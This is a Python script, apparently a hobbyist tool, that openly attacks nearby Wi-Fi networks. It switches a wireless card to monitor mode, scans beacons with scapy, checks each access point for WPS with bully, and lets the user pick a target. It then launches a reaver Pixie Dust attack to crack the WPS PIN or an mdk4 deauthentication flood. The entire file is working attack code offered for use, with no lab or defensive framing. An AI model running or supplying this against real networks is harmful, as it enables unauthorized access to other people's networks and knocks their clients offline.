'''
MIT License
Copyright (c) 2025 Alex
'''

from scapy.all import sniff, Dot11, Dot11Elt
import subprocess
import shlex
import time
import os

def check_root():
    if os.geteuid() != 0:
        print("This script must be run as root. Please use 'sudo'.")
        exit(1)

def set_monitor_mode(interface):
    print(f"Setting interface {interface} to monitor mode...")
    subprocess.call(shlex.split(f"ip link set {interface} down"))
    subprocess.call(shlex.split(f"iw {interface} set monitor control"))
    subprocess.call(shlex.split(f"ip link set {interface} up"))
    print("Monitor mode enabled.")

def get_channel(pkt):
    elt = pkt.getlayer(Dot11Elt)
    while elt:
        if elt.ID == 3:
            if elt.info and len(elt.info) >= 1:
                return elt.info[0]
        elt = elt.payload.getlayer(Dot11Elt)
    return None

def check_wps(bssid, channel, interface):
    # Виконуємо bully з таймаутом 10 секунд
    command = [
        "bully", interface,
        "-b", bssid,
        "-c", str(channel),
        "-Q", "-T"
    ]
    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=10)
        output = result.stdout + result.stderr
        if "WPS" in output and "WPS version" in output:
            return True
        return False
    except subprocess.TimeoutExpired:
        return False

def scan_networks(packet):
    if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        ssid = packet.info.decode('utf-8', errors='ignore') or "<hidden>"
        bssid = packet.addr2 or "<unknown>"
        channel = get_channel(packet)
        if channel and not any(net['BSSID'] == bssid for net in networks):
            wps_enabled = check_wps(bssid, channel, interface)
            networks.append({
                'SSID': ssid,
                'BSSID': bssid,
                'Channel': channel,
                'WPS': wps_enabled
            })
            print(f"Found: SSID: {ssid}, BSSID: {bssid}, Channel: {channel}, WPS: {'Yes' if wps_enabled else 'No'}")

def run_pixie_dust():
    try:
        print("\nRunning Pixie Dust attack...")
        args = [
            "reaver",
            "-i", interface,
            "-b", target['BSSID'],
            "-c", str(target['Channel']),
            "-K", "1",
            "-f",
            "-vvv"
        ]

        process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        try:
            stdout, stderr = process.communicate(timeout=120)
        except subprocess.TimeoutExpired:
            process.kill()
            stdout, stderr = process.communicate()
            print("Pixie Dust attack stopped after 120 seconds timeout.")
            return

        if process.returncode == 0:
            print("Pixie Dust attack completed successfully.")
            print(stdout.decode())
        else:
            print("Error during Pixie Dust attack:")
            print(stderr.decode())
    except Exception as e:
        print(f"An error occurred: {e}")

def run_mdk4():
    try:
        print("\nRunning mdk4 attack...")
        subprocess.call(shlex.split(f"mdk4 {interface} d -c {target['Channel']}"))
        print("mdk4 command executed.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    check_root()

    while True:
        interface = input("Enter the interface name: ")
        if os.path.exists(f"/sys/class/net/{interface}"):
            break
        else:
            print(f"Interface '{interface}' does not exist. Please enter a valid interface name.")

    set_monitor_mode(interface)

    networks = []
    print("Scanning for networks (press Ctrl+C to stop)...")
    try:
        sniff(iface=interface, prn=scan_networks, store=False)
    except KeyboardInterrupt:
        print("\nScanning stopped by user.")

    if not networks:
        print("No networks found.")
        exit(1)

    print("\nAvailable networks:")
    for idx, net in enumerate(networks):
        print(f"{idx}: {net['SSID']} ({net['BSSID']}) on Channel {net['Channel']} - WPS: {'Yes' if net['WPS'] else 'No'}")

    try:
        choice = int(input("Enter the number of the network to attack: "))
        target = networks[choice]
    except (ValueError, IndexError):
        print("Invalid selection.")
        exit(1)

    while True:
        try:
            print("\nChoose an attack method:")
            print("1. Pixie Dust")
            print("2. mdk4")
            print("3. Exit")
            option = input("Choose attack method: ")

            if option == '1':
                run_pixie_dust()
            elif option == '2':
                run_mdk4()
            elif option == '3':
                print("Exiting.")
                break
            else:
                print("Invalid option.")
        except KeyboardInterrupt:
            print("\nExiting...")
            break
